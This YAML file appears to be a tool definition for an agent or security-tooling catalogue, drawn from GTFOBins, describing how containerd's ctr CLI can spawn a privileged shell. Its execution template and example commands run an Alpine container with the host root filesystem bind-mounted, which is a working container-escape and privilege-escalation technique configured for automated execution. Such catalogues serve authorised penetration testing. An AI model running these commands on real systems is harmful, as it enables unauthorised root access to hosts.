---
id: container-runc-ctr
namespace: container:runc:ctr
name: ctr
description: containerd CLI, can spawn a privileged shell by running a container with host filesystem mount.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
platforms:
  - linux
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - docker
  - runc
artifacts: []
workflow_edges:
  produces:
    - shell-access
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 32
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 32
  network: none
  disk_io: low
allowed-tools:
  - ctr
  - Bash
  - execFile
parameters: []
features:
  - requires-root
  - process-manip
execution:
  template: "ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Spawn a privileged shell via ctr
    command: |
      ctr images pull docker.io/library/alpine:latest
      ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/ctr/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "containerd"
    commands:
      - "apt-get install -y containerd"
---
